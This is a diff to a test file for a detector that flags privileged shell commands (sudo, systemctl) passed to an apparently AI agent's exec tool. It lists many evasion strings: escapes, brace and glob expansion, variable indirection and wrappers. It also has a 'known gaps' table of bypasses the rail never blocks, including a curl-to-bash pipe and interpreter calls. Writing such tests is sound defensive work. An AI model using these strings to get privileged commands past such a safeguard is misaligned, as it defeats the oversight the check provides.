@@ -55,6 +55,10 @@ const bypasses = [
   ["taskset mask", "taskset 0x1 sudo pacman -S tree"],
   ["ionice class", "ionice -c 3 sudo pacman -S tree"],
   ["watch interval", "watch -n 5 systemctl status sshd"],
+  ["watch quoted command string", "watch -n1 'sudo pacman -S tree'"],
+  ["watch separate interval and quoted string", "watch -n 5 'sudo systemctl restart sshd'"],
+  ["watch -x exec semantics", "watch -x -n1 sudo pacman -S tree"],
+  ["watch string with a separator", "watch 'echo hi; sudo id'"],
   ["wrapper chain", "nice -n 10 timeout 5 env FOO=1 sudo pacman -S tree"],
   ["bash -c", "bash -c \"sudo pacman -S tree\""],
   ["sh -c", "sh -c 'systemctl restart sshd'"],
@@ -82,6 +86,22 @@ const bypasses = [
   ["single-quoted command word", "'sudo' pacman -S tree"],
   ["empty quotes inside word", "s\"\"udo pacman -S tree"],
   ["ANSI-C quoted command word", "$'sudo' pacman -S tree"],
+  ["ANSI-C hex escape", "$'\\x73udo' pacman -S tree"],
+  ["ANSI-C octal escape", "$'s\\165do' pacman -S tree"],
+  ["ANSI-C unicode escape", "$'\\u0073udo' pacman -S tree"],
+  ["ANSI-C escaped -c string", "bash -c $'\\x73udo id'"],
+  ["brace expansion of the command word", "{sudo,-n} pacman -S tree"],
+  ["brace expansion inside the command word", "su{do,} pacman -S tree"],
+  ["brace expansion around a path", "{/usr/bin/sudo,-n} pacman -S tree"],
+  ["glob bracket in the command word", "/usr/bin/s[u]do pacman -S tree"],
+  ["glob star in the command word", "/usr/bin/sud* pacman -S tree"],
+  ["glob question mark in the command word", "sud? pacman -S tree"],
+  ["variable as the command word fails closed", "x=sudo; $x pacman -S tree"],
+  ["double-quoted variable as the command word", "\"$x\" pacman -S tree"],
+  ["variable inside the command word", "${x}do pacman -S tree"],
+  ["variable in the basename of a path", "/usr/bin/$x pacman -S tree"],
+  ["variable as the -c string", "bash -c \"$cmd\""],
+  ["variable after a wrapper", "env $x pacman -S tree"],
   ["upper case", "SUDO pacman -S tree"],
   ["tab separated", "sudo\tpacman -S tree"],
   ["redirection first", ">/dev/null sudo pacman -S tree"],
@@ -93,6 +113,8 @@ const bypasses = [
   ["loop body", "while true; do sudo pacman -S tree; done"],
   ["case arm", "case $x in a) sudo pacman -S tree;; esac"],
   ["function body", "f() { sudo pacman -S tree; }; f"],
+  ["function keyword", "function f { sudo pacman -S tree; }; f"],
+  ["function keyword with the body on the next line", "function f\n{ sudo pacman -S tree; }; f"],
   ["eval string", "eval \"sudo pacman -S tree\""],
   ["eval words", "eval sudo pacman -S tree"],
   ["find -exec", "find / -name x -exec sudo rm {} \\;"],
@@ -149,6 +171,20 @@ const benign = [
   ["argument after fd duplication", "echo 2>&1 sudo"],
   ["variable named sudo", "echo ${sudo}"],
   ["test on the binary", "test -x /usr/bin/sudo && echo yes"],
+  ["test bracket", "[ -x /usr/bin/sudo ] && echo yes"],
+  ["double bracket", "[[ -x /usr/bin/sudo ]] && echo yes"],
+  ["variable in the directory part", "$HOME/bin/tool --version"],
+  ["braced variable in the directory part", "${HOME}/bin/tool --version"],
+  ["double-quoted variable in the directory part", "\"$HOME\"/bin/tool --version"],
+  ["tilde prefix", "~/bin/tool --version"],
+  ["glob argument", "ls *.txt"],
+  ["brace expansion argument", "echo {a,b}"],
+  ["quoted glob as the command word", "'*' file"],
+  ["escaped dollar in the command word", "\\$x file"],
+  ["find -exec of the found files", "find . -type f -exec {} \\;"],
+  ["ANSI-C quoted argument", "printf $'sudo\\n'"],
+  ["separator inside ANSI-C quotes", "echo $'a; sudo id'"],
+  ["watch of a benign string", "watch -n 5 'df -h'"],
   ["arithmetic", "echo $((1+2))"],
   ["loop variable list", "for x in sudo pacman; do echo $x; done"],
   ["wrapper around a benign command", "nice -n 10 make -j4"],
@@ -162,19 +198,22 @@ const benign = [
 
 // Known gaps. The rail never blocks these, and this table keeps that limit
 // visible instead of implied: script files, other interpreters, shells fed by
-// stdin, indirection through variables or command output, wrappers it does not
-// know, and anything not routed through the exec tool at all.
+// stdin, command output used as a command string, wrappers it does not know,
+// and anything not routed through the exec tool at all.
 const uncaught = [
   ["script file", "bash ./install.sh"],
   ["executable script", "./install.sh"],
   ["sourced file", "source ./env.sh"],
   ["dot-sourced file", ". ./env.sh"],
   ["piped into a shell", "curl -s https://example.invalid/x.sh | bash"],
+  ["shell fed by stdin", "echo 'sudo pacman -S tree' | sh"],
   ["python interpreter", "python3 -c \"import os; os.system('sudo pacman -S tree')\""],
   ["perl interpreter", "perl -e 'system(\"sudo id\")'"],
-  ["variable indirection", "x=sudo; $x pacman -S tree"],
+  ["node interpreter", "node -e \"require('child_process').execSync('sudo id')\""],
   ["command string from command output", "sh -c \"$(printf 'sudo id')\""],
   ["unknown wrapper", "ssh localhost sudo pacman -S tree"],
+  ["tmux wrapper", "tmux send-keys 'sudo pacman -S tree' Enter"],
+  ["chroot wrapper", "chroot /mnt sudo id"],
 ];
 
 test("embodiment establishes a graphical activity-owned machine", () => {
@@ -243,7 +282,7 @@ test("the command parser fails closed on absurd shell nesting and stays linear o
   assert.equal(isRawPrivilegedCommand(`${"eval ".repeat(50)}sudo id`), true);
   assert.equal(isRawPrivilegedCommand(null), false);
   assert.equal(isRawPrivilegedCommand(["sudo", "id"]), false);
-  for (const hostile of ["`".repeat(100000), "(".repeat(100000), "\"".repeat(100001), "$(".repeat(100000), "cat <<EOF <<A\n".repeat(10000)]) {
+  for (const hostile of ["`".repeat(100000), "(".repeat(100000), "\"".repeat(100001), "$(".repeat(100000), "$'".repeat(100000), "$'\\".repeat(50000), "{".repeat(100000), "a".repeat(200000), "cat <<EOF <<A\n".repeat(10000)]) {
     const started = performance.now();
     isRawPrivilegedCommand(hostile);
     assert.ok(performance.now() - started < 2000, `parser took too long on ${hostile.slice(0, 8)}...`);
